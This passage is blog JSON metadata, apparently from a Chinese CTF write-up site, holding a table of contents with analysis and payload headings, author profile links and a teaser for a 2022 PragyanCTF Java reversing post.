href=\"#2-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A\"><span class=\"toc-text\">2.程序分析：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%EF%BC%9A\"><span class=\"toc-text\">1.查看程序保护：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E7%A8%8B%E5%BA%8F%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%EF%BC%9A\"><span class=\"toc-text\">2.程序静态分析：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-Payload%EF%BC%9A\"><span class=\"toc-text\">3.Payload：</span></a></li></ol></li></ol>","author":{"name":"Big Devils","slug":"blog-author","avatar":"https://sm.ms/image/RYFbiSZI3exXNwd.jpg","link":"/","description":"整个博客督促自己学习<br>CrackMe笔记放在吾爱上<br>BUUOJ的做题笔记在看雪上","socials":{"github":"https://github.com/damowang-cxx","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"52pojie":{"icon":"/svg/noa.svg","link":"https://www.52pojie.cn/forum.php?mod=viewthread&tid=1609332&page=1#pid42026727"},"kanxue":{"icon":"/svg/images.svg","link":"https://bbs.pediy.com/user-920613-1.htm"}}}},"mapped":true,"prev_post":{},"next_post":{"title":"2022年2月PragyanCTF比赛记录","uid":"dbf28d0c1562fa16371756c5d1c38cce","slug":"比赛记录/2022年2月PragyanCTF比赛记录","date":"2022-03-14T16:50:11.000Z","updated":"2022-03-28T10:30:41.337Z","comments":true,"path":"api/articles/比赛记录/2022年2月PragyanCTF比赛记录.json","keywords":null,"cover":"https://bokeimage-1307947644.cos.ap-guangzhou.myqcloud.com/%E5%8D%9A%E5%AE%A2%E8%83%8C%E6%99%AF%E5%9B%BE/wallhaven/null2ba55ad8cebc4863.jpg","text":" Reverse 考点 Oak java源代码，算法逆向 Oak 题目描述 Just little understanding of java would be enough Oak.class。 源代码： // // Source code recreated from a ....","link":"","photos":[],"count_time":{"symbolsCount":"7.3k","symbolsTime":"7 mins."},"categories":[{"name":"比赛记录","slug":"比赛记录","count":2,"path":"api/categories/比赛记录.json"}],"tags":[{"name":"WP","slug":"WP","count":12,"path":"api/tags/WP.json"}],"author":{"name":"Big Devils","slug":"blog-author","avatar":"https://sm.ms/image/RYFbiSZI3exXNwd.jpg","link":"/","description":"整个博客督促自己学习<br>CrackMe笔记放在吾爱上<br>BUUOJ的做题笔记在看雪上","socials":{"github":"https://github.com/damowang-cxx","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"52pojie":{"icon":"/svg/noa.svg","link":"https://www.52pojie.cn/forum.php?mod=viewthread&tid=1609332&page=1#pid42026727"},"kanxue":{"icon":"/svg/images.svg","link":"https://bbs.pediy.com/user-920613-1.htm"}}}},"feature":true}}